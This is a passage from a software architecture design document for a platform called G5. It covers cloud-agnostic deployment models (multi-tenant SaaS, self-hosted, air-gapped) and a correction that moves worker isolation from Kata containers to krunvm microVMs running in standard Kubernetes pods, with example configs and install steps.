**No application changes needed.** g5-api connects via a standard `REDIS_URL`. Valkey (the Redis fork under Linux Foundation) is a good open-source alternative for self-hosted deployments that want to avoid Redis licensing concerns.

#### 8.2.7 Container Registry (replacing ghcr.io)

**Current:** GitHub Container Registry (`ghcr.io`) with Cosign signing.

| Environment | Implementation |
|-------------|---------------|
| Multi-tenant | ghcr.io, Docker Hub, or cloud-native registry |
| AWS | ECR |
| Azure | ACR |
| GCP | Artifact Registry |
| On-prem | Harbor (open-source, supports OCI, Cosign, replication) |

CI/CD builds push to a configurable `IMAGE_REGISTRY` variable. No application code changes.

#### 8.2.8 Observability (not yet in specs — needed)

The specs currently have no observability stack specified. This matters for cloud-agnostic deployments:

| Concern | Cloud-Agnostic Solution | Cloud-Native Options |
|---------|------------------------|---------------------|
| Logging | OpenTelemetry → stdout JSON (any collector) | Cloud Logging, CloudWatch, Azure Monitor |
| Metrics | Prometheus (pull) or OTLP (push) | Cloud Monitoring, CloudWatch, Azure Monitor |
| Tracing | OpenTelemetry SDK → Jaeger/Tempo | Cloud Trace, X-Ray, Azure Monitor |
| Alerting | Alertmanager (Prometheus) or Grafana | PagerDuty, OpsGenie (cloud-agnostic) |

**Recommendation:** Use OpenTelemetry SDK in g5-api and g5d. Emit traces + metrics via OTLP. Log to stdout as structured JSON. The collector routing (to Jaeger vs Cloud Trace vs X-Ray) is an infra concern.

The `tracing` crate (already in use) supports `tracing-opentelemetry` for export.

### 8.3 Deployment Models

#### Model 1: Multi-Tenant SaaS (GCP / AWS / Azure)

```
┌─────────────────────────────────────────────────────────────────────────┐
│                        G5 Multi-Tenant SaaS                             │
│                                                                         │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐                  │
│  │  Org A       │  │  Org B       │  │  Org C       │                  │
│  │  (tenant)    │  │  (tenant)    │  │  (tenant)    │                  │
│  └──────┬───────┘  └──────┬───────┘  └──────┬───────┘                  │
│         │                 │                 │                           │
│  ┌──────▼─────────────────▼─────────────────▼──────────────────────┐   │
│  │  Shared Control Plane                                            │   │
│  │                                                                  │   │
│  │  g5-api (N replicas, stateless)                                  │   │
│  │  PostgreSQL (shared DB, tenant isolation via org_id FK)           │   │
│  │  Redis (shared, key-prefixed per tenant)                          │   │
│  │  Object Storage (shared bucket, prefix-scoped per workspace)     │   │
│  └──────────────────────────┬──────────────────────────────────────┘   │
│                             │                                          │
│  ┌──────────────────────────▼──────────────────────────────────────┐   │
│  │  Worker Pool (autoscaled, tenant-scoped)                         │   │
│  │                                                                  │   │
│  │  Worker pods: Kata-isolated, each assigned to ONE workspace      │   │
│  │  Network: outbound-only (control plane + object storage + git)   │   │
│  │  IAM: application-enforced prefix scoping (L1)                   │   │
│  │       + cloud-native IAM conditions (L2, defense-in-depth)       │   │
│  └─────────────────────────────────────────────────────────────────┘   │
│                                                                         │
│  Cloud: GCP (GKE + GCS) OR AWS (EKS + S3) OR Azure (AKS + Blob)      │
└─────────────────────────────────────────────────────────────────────────┘
```

**Tenant isolation guarantees:**
- **Compute:** Each task runs in a Kata VM. Cross-tenant VM escape requires hypervisor breakout.
- **Data:** All queries filter by `org_id`. Object storage paths are prefixed per workspace and enforced at application layer + cloud IAM.
- **Network:** Worker pods have no inbound access. Can't reach other workers.
- **Secrets:** AES-256-GCM encrypted per-org. KEK in cloud KMS. Org A's secrets can't be decrypted by Org B's workers.

**VPC-based access — do we need it?**

Yes, for enterprise customers. Two flavors:

| Type | What It Means | When Needed |
|------|---------------|-------------|
| **VPC Peering / PrivateLink** | Customer's VPC can reach g5-api via private IP (no public internet) | Enterprise: "our developers can only access tools from our VPN" |
| **Customer VPC Workers** | G5 worker pods run inside the customer's VPC, connecting back to G5 control plane | Enterprise: "code never leaves our network" (compliance, regulated industries) |

**VPC Peering / PrivateLink (simpler):**
```
Customer VPC ──── PrivateLink ────► G5 API (private endpoint)
                                    │
                                    ▼
                              G5 Worker Pool (in G5's VPC)
                              Code cloned into G5's infra
```

This lets the customer access G5 without public internet, but code still runs in G5's infrastructure. Sufficient for most enterprise customers.

**Customer VPC Workers (stricter):**
```
Customer VPC
├── G5 Worker Pods (deployed by customer, Kata-isolated)
│   └── Connect outbound to G5 Control Plane via PrivateLink
│
G5 SaaS VPC
├── G5 API (control plane)
├── PostgreSQL
└── Object Storage
```

Workers run in the customer's VPC. Code never leaves their network. Control plane traffic (task dispatch, CRDT sync, job status) flows over PrivateLink. This is the "data never leaves your network" model for regulated industries (finance, healthcare, government).

**Implementation impact:** VPC peering and PrivateLink are infra-only concerns — no application code changes. The g5d worker connects to `G5_API_URL` regardless of whether that's a public endpoint or a PrivateLink endpoint. Customer VPC Workers require the g5d worker image to be pullable from the customer's registry (Harbor, ECR, ACR).

#### Model 2: Single-Tenant Self-Hosted (Cloud)

```
┌─────────────────────────────────────────────────────────────────────────┐
│                  Customer Cloud Account (GCP/AWS/Azure)                  │
│                                                                         │
│  ┌─────────────────────────────────────────────────────────────────┐   │
│  │  Customer-Managed K8s Cluster (EKS / AKS / GKE / vanilla K8s) │   │
│  │                                                                  │   │
│  │  ┌──────────────┐  ┌──────────────┐  ┌──────────────────────┐  │   │
│  │  │  g5-api      │  │  PostgreSQL  │  │  Redis               │  │   │
│  │  │  (Deployment) │  │  (Operator   │  │  (Operator or       │  │   │
│  │  │              │  │   or managed) │  │   managed)           │  │   │
│  │  └──────────────┘  └──────────────┘  └──────────────────────┘  │   │
│  │                                                                  │   │
│  │  ┌──────────────────────────────────────────────────────────┐  │   │
│  │  │  Worker Pool (Kata-isolated pods)                         │  │   │
│  │  │  Object Storage: S3 / GCS / Azure Blob / MinIO           │  │   │
│  │  │  Registry: ECR / ACR / Harbor (pulls g5 images)          │  │   │
│  │  └──────────────────────────────────────────────────────────┘  │   │
│  └─────────────────────────────────────────────────────────────────┘   │
│                                                                         │
│  All data stays in customer account.                                    │
│  G5 provides: Helm chart + operator + image updates.                    │
│  Customer provides: K8s cluster + storage + DB + auth integration.     │
└─────────────────────────────────────────────────────────────────────────┘
```

**What G5 ships:**
1. **Helm chart** — Deploys g5-api, worker pool, migrations job, config
2. **Operator (optional)** — CRD-based management of workspaces, workers, upgrades
3. **Container images** — g5-api, g5d, worker-base, edge (signed with Cosign)
4. **Migration CLI** — `g5-api migrate` for schema upgrades

**What the customer provides:**
- Kubernetes cluster with Kata support (or accept process-level isolation)
- PostgreSQL 17+ with pgvector
- Redis 7+
- S3-compatible object storage
- DNS + TLS termination (ingress controller)
- Identity provider integration (see below)

**Auth in self-hosted:**
The built-in GitHub/Google/GitLab OAuth works if the customer has internet access. For enterprises with their own IdP:

| Scenario | Solution |
|----------|---------|
| Corporate SSO (Okta, Azure AD, etc.) | Add OIDC provider — g5-api validates JWT from customer's IdP |
| LDAP | LDAP auth module or OIDC bridge (Dex, Keycloak) |
| No external IdP | Local username/password accounts (stored in Postgres, bcrypt hashed) |

**Proposed: Generic OIDC provider support.**

```rust
// In addition to GitHub/Google/GitLab specific OAuth flows:
pub struct OidcProvider {
    pub issuer_url: String,          // https://login.microsoftonline.com/{tenant}/v2.0
    pub client_id: String,
    pub client_secret: String,
    pub scopes: Vec<String>,         // ["openid", "email", "profile"]
    pub user_id_claim: String,       // "sub" or "oid" or "email"
    pub email_claim: String,         // "email"
    pub display_name_claim: String,  // "name" or "preferred_username"
}
```

Add `oidc` as a fourth entry in the OAuth provider enum. The OIDC discovery endpoint (`/.well-known/openid-configuration`) provides all the URLs automatically. This covers Okta, Azure AD, Keycloak, Dex, Auth0, and any other OIDC-compliant IdP.

#### Model 3: Single-Tenant Self-Hosted (On-Prem / Air-Gapped)

```
┌─────────────────────────────────────────────────────────────────────────┐
│                  Customer Data Center (No Internet)                      │
│                                                                         │
│  ┌─────────────────────────────────────────────────────────────────┐   │
│  │  K8s Cluster (RKE2 / K3s / vanilla K8s)                        │   │
│  │                                                                  │   │
│  │  g5-api ──► PostgreSQL (self-managed or CloudNativePG operator)  │   │
│  │         ──► Redis/Valkey (self-managed)                          │   │
│  │         ──► MinIO (S3-compatible object storage)                 │   │
│  │         ──► Harbor (container registry, air-gap mirror)          │   │
│  │         ──► Vault (HashiCorp, for KEK management)               │   │
│  │                                                                  │   │
│  │  Workers ──► krunvm/libkrun (microVM isolation)                 │   │
│  │          ──► MinIO (build cache, repo snapshots)                 │   │
│  │          ──► vLLM + local model (Llama, CodeLlama, Devstral)    │   │
│  │                                                                  │   │
│  │  Auth: Keycloak/Dex (OIDC) or local accounts                   │   │
│  │  Git: GitLab CE (self-hosted) or Gitea                          │   │
│  │  Observability: Prometheus + Grafana + Loki                     │   │
│  └─────────────────────────────────────────────────────────────────┘   │
│                                                                         │
│  Zero external dependencies. All images pre-loaded into Harbor.        │
│  LLM inference runs locally via vLLM with open-weight models.          │
│  Upgrades: air-gap bundle (tarball of images + Helm chart + migrations) │
└─────────────────────────────────────────────────────────────────────────┘
```

**Air-gap requirements:**
1. **Container images:** Shipped as OCI tarballs, loaded into Harbor via `harbor push` or `docker load`
2. **LLM models:** vLLM with Devstral/Llama/CodeLlama/Qwen — model weights shipped as part of the worker base image or loaded from MinIO
3. **Git remotes:** Self-hosted GitLab CE, Gitea, or bare Git server. SCM OAuth configured against the local GitLab instance
4. **No cloud KMS:** HashiCorp Vault (self-hosted) or file-based KEK
5. **No embedding API:** Use a local embedding model (e.g., `sentence-transformers` via vLLM, or Postgres `pg_embedding` extension) for search
6. **Upgrades:** Air-gap bundle = `{images.tar.gz, chart-${version}.tgz, migrations.sql, CHANGELOG.md}`

### 8.4 Configuration Unification — `g5.env` Profile System

Instead of spreading cloud-specific config across many files, define deployment profiles:

```yaml
# g5-config.yaml (or Helm values.yaml)

# Profile selects defaults for all subsystems
profile: "self-hosted"  # "saas-gcp" | "saas-aws" | "saas-azure" | "self-hosted" | "air-gapped"

# Object storage
storage:
  backend: "s3"          # "s3" | "gcs" | "azure" | "filesystem"
  bucket: "g5-data"
  endpoint: "http://minio:9000"    # null for cloud-native
  region: "us-east-1"
  access_key_id: "${G5_S3_ACCESS_KEY}"
  secret_access_key: "${G5_S3_SECRET_KEY}"

# Key management
kms:
  backend: "vault"       # "gcp-secret-manager" | "aws-kms" | "azure-keyvault" | "vault" | "env" | "file"
  vault_addr: "http://vault:8200"
  vault_token: "${VAULT_TOKEN}"
  # OR for file-based:
  # backend: "file"
  # kek_path: "/run/secrets/g5-kek"

# Identity
auth:
  providers:
    - type: "oidc"
      issuer_url: "https://keycloak.internal/realms/g5"
      client_id: "g5-app"
      client_secret: "${OIDC_CLIENT_SECRET}"
    # OR for SaaS:
    # - type: "github"
    #   client_id: "..."
    #   client_secret: "..."
    # - type: "google"
    # - type: "gitlab"

# LLM
llm:
  default_provider: "vllm"
  proxy_mode: "server"   # "server" (credentials on server) | "passthrough" (worker has keys)
  providers:
    vllm:
      base_url: "http://vllm:8000"
      model: "devstral-small-2505"
    # OR for SaaS:
    # openai:
    #   api_key: "${OPENAI_API_KEY}"
    # anthropic:
    #   api_key: "${ANTHROPIC_API_KEY}"

# Container runtime
workers:
  isolation: "kata"      # "kata" | "krunvm" | "process"
  image: "harbor.internal/g5/g5d:latest"
  registry: "harbor.internal"  # for air-gap

# Observability
observability:
  backend: "otlp"        # "otlp" | "stdout" | "gcp" | "aws"
  otlp_endpoint: "http://otel-collector:4317"
```

**Helm chart abstraction:**

```yaml
# Helm values-self-hosted.yaml
global:
  profile: self-hosted
  
storage:
  backend: s3
  endpoint: http://minio:9000
  
database:
  host: postgres.internal
  port: 5432
  
redis:
  host: redis.internal
  port: 6379
  
kms:
  backend: file
  kekPath: /run/secrets/g5-kek

auth:
  providers:
    - type: oidc
      issuerUrl: https://keycloak.internal/realms/g5
```

### 8.5 Infrastructure-as-Code Strategy

**Current:** GCP-only Terraform modules.

**Proposed: Multi-provider Terraform + Helm.**

```
infra/
├── helm/
│   └── g5/                          # Helm chart (cloud-agnostic K8s manifests)
│       ├── Chart.yaml
│       ├── values.yaml              # Default values
│       ├── values-saas-gcp.yaml     # GCP multi-tenant overrides
│       ├── values-saas-aws.yaml     # AWS multi-tenant overrides
│       ├── values-saas-azure.yaml   # Azure multi-tenant overrides
│       ├── values-self-hosted.yaml  # Self-hosted defaults
│       ├── values-air-gapped.yaml   # Air-gapped defaults
│       └── templates/
│           ├── api-deployment.yaml
│           ├── worker-statefulset.yaml
│           ├── migrations-job.yaml
│           ├── networkpolicy.yaml
│           └── ...
│
├── terraform/
│   ├── modules/
│   │   ├── gcp/                     # GCP-specific: GKE, Cloud SQL, Memorystore, GCS
│   │   │   ├── main.tf
│   │   │   ├── variables.tf
│   │   │   └── outputs.tf
│   │   ├── aws/                     # AWS-specific: EKS, RDS, ElastiCache, S3
│   │   │   ├── main.tf
│   │   │   ├── variables.tf
│   │   │   └── outputs.tf
│   │   ├── azure/                   # Azure-specific: AKS, Azure DB, Azure Cache, Blob
│   │   │   ├── main.tf
│   │   │   ├── variables.tf
│   │   │   └── outputs.tf
│   │   └── shared/                  # Shared: K8s resources, Helm releases
│   │       ├── kata-runtime.tf
│   │       └── helm-g5.tf
│   │
│   ├── envs/                        # Per-environment root modules
│   │   ├── saas-gcp-prod/
│   │   ├── saas-gcp-staging/
│   │   ├── customer-aws-acme/
│   │   └── ...
│   └── variables-common.tf
│
└── docker-compose/
    ├── docker-compose.yml           # Local dev (Postgres + Redis + MinIO)
    ├── docker-compose.self-hosted.yml  # Single-node self-hosted
    └── .env.example
```

### 8.6 Implementation Priority

| # | Change | Effort | Impact | Priority |
|---|--------|--------|--------|----------|
| 1 | `ObjectStore` trait + `object_store` crate integration (replace all `gs://` refs) | **M** | Unlocks all deployments | **P0** |
| 2 | `KeyManager` trait + env/file/Vault backends | **S** | Unlocks self-hosted | **P0** |
| 3 | OIDC generic provider for auth | **S** | Unlocks enterprise SSO | **P0** |
| 4 | Helm chart for K8s deployment | **L** | Replaces GCP-only Terraform for app layer | **P0** |
| 5 | Application-enforced workspace prefix scoping (remove Workload Identity dependency) | **M** | Unlocks non-GCP | **P1** |
| 6 | OpenTelemetry integration (replace implicit Cloud Logging dependency) | **S** | Proper observability | **P1** |
| 7 | sccache S3 config (replace `SCCACHE_GCS_*` env vars) | **S** | Build cache portability | **P1** |
| 8 | docker-compose.self-hosted.yml (single-node, no K8s) | **S** | Easy on-prem trial | **P1** |
| 9 | AWS Terraform modules | **L** | Multi-cloud SaaS | **P2** |
| 10 | Azure Terraform modules | **L** | Multi-cloud SaaS | **P2** |
| 11 | VPC peering / PrivateLink support | **M** | Enterprise access model | **P2** |
| 12 | Air-gap bundle tooling (image export, offline Helm) | **M** | Air-gapped deployments | **P3** |
| 13 | Local account auth (no external IdP) | **S** | Minimal self-host | **P3** |

### 8.7 Open Questions (Cloud-Agnostic)

13. **Embedding model for air-gapped:** pgvector search needs embeddings. In multi-tenant SaaS, we use OpenAI's `text-embedding-3-small`. For air-gapped, options: (a) bundle a small embedding model in the worker image and run via vLLM, (b) use Postgres `pg_embedding` extension for in-DB embedding, (c) disable semantic search and fall back to FTS-only.

14. **License model for self-hosted:** How is G5 licensed for self-hosted? Per-seat? Per-worker? Flat fee? This affects whether we need license key validation in g5-api or if it's purely contractual.

15. **Upgrade strategy for self-hosted:** Who runs database migrations for self-hosted customers? Options: (a) migration job in Helm chart runs automatically, (b) customer runs `g5-api migrate` manually, (c) g5-api auto-migrates on startup (dangerous).

16. **Multi-region for SaaS:** Should multi-tenant SaaS support multiple regions (e.g., US + EU)? Data residency laws (GDPR) may require EU customer data to stay in EU. This means region-aware routing at the API gateway level and per-region Postgres replicas.

17. **Storage costs for multi-tenant:** In multi-tenant, one bucket is shared. Who pays for storage? Need per-workspace usage tracking for metered billing. The `usage_records` table may need object storage metrics alongside LLM token counts.

---

## 9. Isolation Model Correction — krunvm Everywhere, No Kata

### 9.1 The Bug

The specs contain a fundamental error about cloud worker isolation. They describe **two different isolation models** depending on deployment context:

- **Local:** g5d launches krunvm microVMs per task (correct)
- **Cloud:** "Kata VMs managed by Kubernetes, the pod itself IS the isolation boundary, g5d's isolation module is not used" (WRONG)

The correct model is **uniform**: g5d launches krunvm microVMs in **every** deployment context. Cloud workers run inside a standard runc K8s pod, and g5d inside that pod launches krunvm microVMs for task isolation — exactly like it does on a laptop. The pod is NOT the isolation boundary. The microVM is.

```
WRONG (current spec):
  Cloud pod (runtimeClassName: kata)     ← Pod IS the VM
  └── g5d (ProcessBackend)               ← No isolation module used
      └── task runs directly in pod

CORRECT:
  Cloud pod (standard runc, /dev/kvm mounted)
  └── g5d (KrunvmBackend)               ← Same isolation module as local
      └── krunvm microVM                 ← THIS is the isolation boundary
          └── task runs inside microVM
```

This means:
- **No Kata dependency at all.** Kata Containers is not used, not installed, not referenced.
- **No `runtimeClassName: kata`** in pod specs. Standard runc containers.
- **`/dev/kvm` device** must be mounted into the worker pod for nested virtualization.
- **g5d's isolation module is ALWAYS used** — cloud, local, self-hosted, everywhere.
- **The `KrunvmBackend` is the universal isolation backend** (with `ProcessBackend` as fallback).

### 9.2 Why krunvm-in-pod, Not Kata

| Aspect | Kata (pod = VM) | krunvm-in-pod |
|--------|----------------|---------------|
| **Isolation granularity** | One VM per pod. Pod = task. | One pod can run multiple sequential tasks, each in its own microVM. Pod reuse = warm cache. |
| **Startup** | Pod scheduling + Kata VM boot (~10-30s) | Pod already running; krunvm boot (~2-5s) |
| **Code reuse** | Two isolation models to maintain (K8s Kata for cloud, krunvm for local) | One model everywhere. Same `KrunvmBackend` code, same `MicrovmRunSpec`, same tests. |
| **K8s dependency** | Requires Kata RuntimeClass, Kata agent, Kata shim — heavy cluster add-on | Standard runc pods. Only needs `/dev/kvm` device plugin. |
| **Cloud portability** | Kata support varies by cloud (GKE: some node types, EKS: not native, AKS: preview) | `/dev/kvm` available on any nested-virt-capable node (all major clouds) |
| **Self-hosted** | Must install Kata + configure RuntimeClass on customer K8s | Just needs KVM-capable nodes. Standard container. |
| **macOS** | Not applicable (Kata is Linux-only) | libkrun uses Hypervisor.framework natively |
| **Rootless** | Kata requires host-level privileges for the Kata shim | krunvm can run rootless with `/dev/kvm` access (no root, no container toolchain) |
| **DinD/nested containers** | A Kata advantage over runc, but irrelevant since we're running microVMs not containers | podman runs inside the microVM guest kernel — same isolated nesting benefit |

### 9.3 Deployment Matrix — krunvm Everywhere

| Deployment | Host | Pod/Process | Isolation | KVM/HVF Source |
|------------|------|-------------|-----------|----------------|
| **macOS laptop** | macOS ARM64 | g5d process | krunvm via Hypervisor.framework (HVF) | Native HVF — no KVM needed |
| **Linux laptop** | Linux x86_64/aarch64 | g5d process | krunvm via KVM | `/dev/kvm` (user in `kvm` group) |
| **Cloud K8s** | Linux node (nested virt enabled) | Standard runc pod | krunvm via KVM | `/dev/kvm` mounted into pod via device plugin |
| **Self-hosted K8s** | Linux node with KVM | Standard runc pod | krunvm via KVM | `/dev/kvm` mounted into pod |
| **Self-hosted bare metal** | Linux server | g5d process (systemd) | krunvm via KVM | `/dev/kvm` directly |
| **Self-hosted macOS** (Mac Mini/Studio) | macOS ARM64 | g5d process (launchd) | krunvm via HVF | Native HVF |
| **Windows** | WSL2 | g5d process in WSL2 | krunvm via KVM (WSL2 kernel) | `/dev/kvm` in WSL2 guest |
| **CI runner** | Linux VM with nested virt | g5d process | krunvm via KVM | `/dev/kvm` |
| **Fallback (no KVM/HVF)** | Any | g5d process | ProcessBackend (git worktree only) | N/A |

### 9.4 Cloud Pod Spec — What Actually Changes

**Before (wrong — Kata):**
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: g5d-worker-${WORKER_ID}
spec:
  runtimeClassName: kata          # ← REMOVE
  containers:
  - name: g5d
    image: ghcr.io/g5/g5d:latest
    # g5d runs ProcessBackend inside (wrong)
```

**After (correct — krunvm in standard runc pod):**
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: g5d-worker-${WORKER_ID}
spec:
  # No runtimeClassName — standard runc container
  containers:
  - name: g5d
    image: ghcr.io/g5/g5d:latest   # includes krunvm + libkrun
    securityContext:
      runAsNonRoot: true            # rootless
      runAsUser: 1000
      allowPrivilegeEscalation: false
    resources:
      limits:
        devices.kubevirt.io/kvm: "1"   # KVM device plugin
        # OR: mount /dev/kvm manually via device plugin
        cpu: "8"
        memory: "32Gi"
    volumeMounts:
    - name: workspace
      mountPath: /work
    - name: cache
      mountPath: /cache
    env:
    - name: G5_ISOLATION_MODE
      value: "microvm"             # g5d uses KrunvmBackend (same as local)
    - name: G5_API_URL
      value: "http://g5-api:8080"
    - name: G5_WORKER_TOKEN
      value: "${WORKER_TOKEN}"
```

**KVM device plugin options:**
1. **`kubevirt.io/device-plugins`** — Mature, widely used. Exposes `/dev/kvm` as a schedulable resource.
2. **`smarter-device-manager`** — Lightweight alternative. Configurable device list.
3. **Manual `hostPath`** — Simplest for single-node / self-hosted: mount `/dev/kvm` directly. Not recommended for multi-tenant.

### 9.5 macOS Self-Hosted Deployment

macOS (Apple Silicon) is a first-class deployment target for g5d workers:

```
macOS ARM64 (Mac Mini / Mac Studio / MacBook)
├── g5d binary (universal binary or aarch64-apple-darwin)
│   └── KrunvmBackend → libkrun → Hypervisor.framework
│       └── microVM per task (arm64 guest kernel)
├── No Docker required
├── No Kubernetes required  
├── No KVM required (HVF is native)
└── Managed via launchd (daemon) or direct invocation
```

**Installation options:**

1. **Homebrew (preferred for dev):**
   ```bash
   brew install g5/tap/g5d
   # Installs: g5d binary + krunvm + libkrun (built for HVF)
   # Creates: launchd plist for daemon mode (optional)
   ```

2. **Direct download:**
   ```bash
   curl -L https://releases.g5.dev/g5d/latest/g5d-aarch64-apple-darwin.tar.gz | tar xz
   sudo mv g5d /usr/local/bin/
   # krunvm and libkrun bundled or also installed via brew
   ```

3. **macOS .pkg installer (enterprise):**
   - Signed and notarized .pkg
   - Installs g5d + krunvm + libkrun
   - Creates launchd daemon plist
   - Configures at `/etc/g5d/config.yaml`

**launchd daemon config:**
```xml
<!-- /Library/LaunchDaemons/dev.g5.g5d.plist -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>
  <string>dev.g5.g5d</string>
  <key>ProgramArguments</key>
  <array>
    <string>/usr/local/bin/g5d</string>
    <string>--role</string>
    <string>worker</string>
    <string>--config</string>
    <string>/etc/g5d/config.yaml</string>
  </array>
  <key>KeepAlive</key>
  <true/>
  <key>RunAtLoad</key>
  <true/>
  <key>StandardOutPath</key>
  <string>/var/log/g5d/stdout.log</string>
  <key>StandardErrorPath</key>
  <string>/var/log/g5d/stderr.log</string>
</dict>
</plist>
```

**macOS-specific considerations:**
- **No root required.** HVF doesn't need root — any user can create VMs. The g5d process runs as a regular user.
- **Entitlements.** The g5d binary needs the `com.apple.security.hypervisor` entitlement for HVF access. This is set at build time via code signing.
- **Intel Macs not supported.** libkrun doesn't support x86_64 HVF. Intel Macs fall back to `ProcessBackend`.

### 9.6 Linux Self-Hosted Deployment (Bare Metal / VM)

```
Linux Server (x86_64 or aarch64)
├── g5d binary
│   └── KrunvmBackend → libkrun → KVM
│       └── microVM per task
├── /dev/kvm (user must be in 'kvm' group)
├── No Docker required (unless using Docker for worker image management)
├── No Kubernetes required
└── Managed via systemd
```

**systemd service:**
```ini
# /etc/systemd/system/g5d.service
[Unit]
Description=G5 Worker Daemon
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
User=g5d
Group=g5d
SupplementaryGroups=kvm
ExecStart=/usr/local/bin/g5d --role worker --config /etc/g5d/config.yaml
Restart=always
RestartSec=5

# Security hardening (rootless)
NoNewPrivileges=yes
ProtectSystem=strict
ProtectHome=yes
PrivateTmp=yes
ReadWritePaths=/var/lib/g5d /var/log/g5d /cache

# /dev/kvm access via 'kvm' group membership
DeviceAllow=/dev/kvm rw

[Install]
WantedBy=multi-user.target
```

**Installation:**
```bash
# Debian/Ubuntu
curl -fsSL https://apt.g5.dev/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/g5.gpg
echo "deb [signed-by=/etc/apt/keyrings/g5.gpg] https://apt.g5.dev stable main" | \
  sudo tee /etc/apt/sources.list.d/g5.list
sudo apt update && sudo apt install g5d krunvm

# Or direct binary
curl -L https://releases.g5.dev/g5d/latest/g5d-x86_64-linux-gnu.tar.gz | tar xz
sudo mv g5d /usr/local/bin/

# Create service user
sudo useradd -r -s /sbin/nologin -G kvm g5d
sudo systemctl enable --now g5d
```

### 9.7 Worker Base Image — What's Inside

The worker base image is an OCI image that krunvm boots as a microVM guest. It is NOT a K8s container image (though it's stored in the same registry):

```
ghcr.io/g5/worker:base (OCI image, ~1.5GB)
├── Guest kernel (bundled by libkrun, not in image)
├── rootfs:
│   ├── /usr/bin/git, /usr/bin/rg (ripgrep)
│   ├── /usr/local/rustup/... (Rust stable)
│   ├── /usr/local/bin/python3.12, /usr/local/bin/uv
│   ├── /usr/local/bin/node (Node.js 22)
│   ├── /usr/local/go/bin/go
│   ├── /usr/lib/jvm/java-21 (JDK)
│   ├── /usr/bin/gcc, /usr/bin/g++, /usr/bin/cmake
│   ├── /usr/bin/sccache
│   ├── /usr/bin/podman (rootless nested containers)
│   └── /usr/bin/g5d-agent (agent entrypoint)
├── No Docker daemon
├── No container runtime (no containerd, no runc)
├── No systemd (minimal init)
└── No sshd, no cron, no unnecessary services
```

The guest image is **rootless and container-toolchain-less** — it has development tools but no container infrastructure. Nested containers (if needed) use podman in rootless mode, which doesn't require a daemon.

**Image build is the same** for all deployment targets (local, cloud, self-hosted). The OCI image is pulled by krunvm, which extracts the rootfs and boots it with libkrun's built-in guest kernel.

### 9.8 Impact — What Must Change

#### 9.8.1 Spec Files (210 Kata references to fix across 10 files)

| File | Kata refs | What's wrong | Fix |
|------|-----------|-------------|-----|
| **g5.semlift.md** | 116 | "GKE + Kata", "RuntimeClass: kata", "Kata E2E", isolation § says "Kata VMs managed by K8s", Phase 2 says "Cloud Kata", deployment diagrams show Kata | Replace ALL Kata refs with krunvm-in-pod model. Remove RuntimeClass. Fix deployment diagrams. |
| **infra.semlift.md** | 17 | "GKE with Kata runtime", "Kata RuntimeClass", "runtimeClassName: kata", entire "GKE + Kata Runtime" section | Rewrite to standard runc pods + KVM device plugin. Remove Kata RuntimeClass from Terraform. |
| **integration-stack.semlift.md** | 14 | Kata references in integration test setup | Replace with krunvm-based isolation testing |
| **g5d/tests/isolation_backends.semlift.md** | 40 | `kata-e2e` feature gate name, test names like `test_kata_vm_*` | Rename to `microvm-e2e` / `test_microvm_*`. Same tests, different naming. |
| **g5d/tests.semlift.md** | 11 | "Kata E2E", `kata-e2e` feature, test table lists "kata" | Rename feature gate and test names |
| **g5d/worker.semlift.md** | 4 | "Kata VM", `DeploymentMode::Cloud` described as Kata | Cloud workers use krunvm inside pods, not Kata |
| **g5d/isolation.semlift.md** | 4 | "Cloud GKE pods: Kata VMs... g5d's isolation module is not used" | **CRITICAL FIX**: g5d's isolation module IS used in cloud. KrunvmBackend runs in cloud pods. |
| **g5d.semlift.md** | 2 | "Kata VM-isolated workers" in overview | Replace with krunvm microVM |
| **g5d/main.semlift.md** | 1 | "Kata/krunvm" in exit code table | Just "krunvm" |
| **g5d/config.semlift.md** | 1 | "Kata/krunvm" in IsolationMode doc | Just "krunvm microVM" |

#### 9.8.2 Generated Code (4 references)

| File | Line | Current | Fix |
|------|------|---------|-----|
| `g5d/src/config.rs:87` | `/// Kata/krunvm microVM isolation` | `/// krunvm microVM isolation` |
| `g5d/src/main.rs:161` | `/// Kata/krunvm not available` | `/// krunvm not available` |
| `g5d/src/worker/mod.rs:66` | `/// Cloud worker in Kata VM` | `/// Cloud worker in krunvm microVM` |
| `g5d/src/worker/mod.rs:76` | `/// VM-level isolation with Kata/krunvm` | `/// VM-level isolation with krunvm/libkrun` |

#### 9.8.3 ARCHITECTURE_DISCUSSION.md (this document)

§8.3 (Deployment Models) and §8.2.4 (Container Orchestration) reference Kata. These should be updated once §9 is the authoritative correction.

#### 9.8.4 Key Semantic Changes (not just rename)

These aren't just s/Kata/krunvm/ renames. The **logic** changes:

1. **isolation.semlift.md § Domain Context**: Currently says "g5d's isolation module is not used in cloud context." **MUST change to**: "g5d's isolation module is ALWAYS used. Cloud pods run KrunvmBackend identically to local."

2. **infra.semlift.md GKE section**: Currently describes Kata RuntimeClass as a cluster requirement. **MUST change to**: Standard runc pods with KVM device plugin. Remove Kata from the entire infra provisioning.

3. **g5.semlift.md Phase 2**: Currently says "Cloud Kata is Phase 2." **There is no Phase 2 for isolation** — krunvm is Phase 1 on all platforms.

4. **g5.semlift.md CI/kata-e2e.yml**: The CI workflow that tests on self-hosted KVM runners is still needed — but it tests krunvm microVMs, not Kata containers. Rename `kata-e2e.yml` → `microvm-e2e.yml`.

5. **infra.semlift.md node pool**: Worker nodes don't need "nested virtualization for Kata." They need **KVM support** (which is simpler — any modern Linux node has `/dev/kvm` if the CPU has VT-x/SVM). No special "Kata handler" or RuntimeClass registration needed.

6. **Worker pod security**: Kata pods typically need elevated privileges for the Kata shim agent. krunvm-in-pod needs only `/dev/kvm` access. The pod can be fully rootless with `runAsNonRoot: true`, `allowPrivilegeEscalation: false`. This is **more secure** than Kata.

### 9.9 Open Questions (Isolation)

18. **KVM device plugin choice:** Which K8s device plugin for `/dev/kvm`? `kubevirt.io/device-plugins` is the most mature. `smarter-device-manager` is lighter. For self-hosted single-node, `hostPath` mount is simplest.

19. **krunvm binary in worker image:** Should krunvm/libkrun be bundled inside the K8s worker pod image (the g5d image), or installed on the host node? Bundling in the image is more portable (works on any K8s cluster with KVM nodes). Host installation is simpler for self-hosted.

